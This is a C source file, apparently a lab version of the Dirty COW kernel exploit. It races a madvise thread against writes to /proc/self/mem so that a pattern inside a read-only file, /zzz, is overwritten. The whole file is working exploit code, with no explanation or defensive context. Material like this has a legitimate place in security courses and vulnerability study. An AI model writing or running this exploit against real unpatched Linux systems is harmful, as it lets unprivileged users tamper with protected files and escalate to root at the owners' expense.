/* cow_attack.c */
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>

void *map;

void *madviseThread(void *arg) {
    size_t file_size = *(size_t*)arg;
    while(1) {
        madvise(map, file_size, MADV_DONTNEED);
        usleep(100);
    }
    return NULL;
}

void *writeThread(void *arg) {
    char *content = "******";
    char *position = (char*)arg;
    int f = open("/proc/self/mem", O_RDWR);
    while(1) {
        lseek(f, position - (char*)map, SEEK_SET);
        write(f, content, strlen(content));
        usleep(100);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    pthread_t pth1, pth2;
    struct stat st;
    size_t file_size;

    int f = open("/zzz", O_RDONLY);
    if (f < 0) {
        perror("Failed to open /zzz");
        return 1;
    }

    fstat(f, &st);
    file_size = st.st_size;
    map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
    
    if (map == MAP_FAILED) {
        perror("Failed to map file");
        close(f);
        return 1;
    }

    printf("Starting attack on /zzz (size: %lu bytes)\n", file_size);
    char *position = strstr(map, "222222");
    if (position == NULL) {
        printf("Pattern '222222' not found in file\n");
        munmap(map, file_size);
        close(f);
        return 1;
    }

    printf("Found pattern at offset: %ld\n", position - (char*)map);
    printf("Running exploit... (Press Ctrl+C to stop)\n");

    pthread_create(&pth1, NULL, madviseThread, &file_size);
    pthread_create(&pth2, NULL, writeThread, position);

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    return 0;
}